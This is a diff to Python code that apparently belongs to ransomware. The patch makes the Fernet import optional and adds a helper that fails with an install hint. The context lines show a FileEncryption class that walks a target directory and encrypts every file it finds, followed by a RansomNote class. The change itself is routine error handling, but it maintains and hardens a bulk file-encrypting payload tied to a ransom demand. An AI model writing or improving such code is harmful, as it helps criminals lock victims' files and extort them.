@@ -9,7 +9,18 @@ import json
 import os
 from dataclasses import dataclass, field, asdict
 from typing import List, Dict, Optional
-from cryptography.fernet import Fernet
+try:
+    from cryptography.fernet import Fernet
+except ImportError:  # optional; crypto routines fail with a clear message
+    Fernet = None
+
+
+def _require_fernet():
+    if Fernet is None:
+        raise RuntimeError(
+            "cryptography is required for file encryption: "
+            "python3 -m pip install cryptography")
+    return Fernet
 
 
 @dataclass
@@ -33,7 +44,7 @@ class FileEncryption:
         """Encrypt files in directory."""
         
         encrypted_count = 0
-        cipher = Fernet(key)
+        cipher = _require_fernet()(key)
         
         for root, dirs, files in os.walk(target_directory):
             for file in files:
@@ -61,7 +72,7 @@ class FileEncryption:
     @staticmethod
     def generate_encryption_key() -> bytes:
         """Generate strong encryption key."""
-        return Fernet.generate_key()
+        return _require_fernet().generate_key()
 
 
 class RansomNote:
